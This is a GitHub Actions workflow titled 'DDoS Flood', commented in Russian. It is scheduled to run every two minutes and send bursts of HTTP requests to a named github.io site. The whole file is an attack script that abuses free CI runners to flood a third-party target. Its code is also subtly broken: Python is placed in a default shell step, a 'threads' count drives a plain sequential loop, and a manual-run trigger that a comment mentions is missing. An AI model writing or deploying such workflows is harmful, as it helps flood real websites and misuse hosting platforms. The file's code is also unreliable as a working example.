name: DDoS Flood

on:
  # Запуск каждые 2 минуты (более агрессивный график)
  schedule:
    - cron: '*/2 * * * *'
  
  # Также можно запускать вручную через кнопку "Run workflow"

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.x'
      
      - name: Install dependencies
        run: pip install requests
      
      - name: Run Attack Burst
        run: |
          import requests
          import time
          
          target = "https://srabakio.github.io/"
          threads = 20 # Количество параллельных потоков
          
          for _ in range(threads):
              try:
                  requests.get(target)
              except:
                  pass
              
          print("Burst sent")
